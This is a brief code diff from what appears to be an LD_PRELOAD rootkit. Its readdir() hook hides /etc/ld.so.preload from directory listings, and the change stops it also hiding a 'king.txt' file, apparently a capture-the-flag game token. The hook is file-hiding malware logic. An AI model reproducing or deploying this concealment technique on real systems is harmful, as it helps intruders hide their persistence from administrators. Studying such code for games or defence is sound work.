@@ -130,7 +130,8 @@ struct dirent *readdir(DIR *dirp) {
         }
 
         // Hide /etc/ld.so.preload and /root/king.txt
-        if (strcmp(entry->d_name, "ld.so.preload") == 0 || strcmp(entry->d_name, "king.txt") == 0) {
+        // if (strcmp(entry->d_name, "ld.so.preload") == 0 || strcmp(entry->d_name, "king.txt") == 0) {
+        if (strcmp(entry->d_name, "ld.so.preload") == 0) {
             continue; // Skip this entry
         }
 
